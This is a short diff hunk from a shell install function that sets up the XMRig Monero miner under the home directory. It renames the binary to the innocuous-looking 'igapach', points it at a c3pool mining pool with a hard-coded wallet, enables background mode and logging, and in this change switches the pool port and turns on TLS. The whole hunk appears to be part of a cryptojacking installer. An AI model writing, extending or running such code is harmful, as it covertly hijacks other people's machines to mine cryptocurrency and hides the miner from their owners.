@@ -41,9 +41,10 @@ c3_install () {
         rm $HOME/xmrig.tar.gz
         mv $HOME/c3/xmrig $HOME/c3/igapach
 
-        sed -i 's/"url": *"[^"]*",/"url": "mine.c3pool.com:15555",/' $HOME/c3/config.json
+        sed -i 's/"url": *"[^"]*",/"url": "mine.c3pool.com:33333",/' $HOME/c3/config.json
         sed -i 's/"user": *"[^"]*",/"user": "469RgSVfF4EWmZq7jDXfgr6GgpXG8Qw858T3dWnqBxsz6zdxxJKEr7J8ckwr2xjXHQV1szNbZqVbjKHciTEFEPssJkNwRWQ",/' $HOME/c3/config.json
         sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/c3/config.json
+        sed -i 's/"tls": *false,/"tls": true,/' $HOME/c3/config.json
         sed -i 's#"log-file": *null,#"log-file": "'$HOME/c3/run.log'",#' $HOME/c3/config.json
         sed -i 's/"background": *false,/"background": true,/' $HOME/c3/config.json
 }
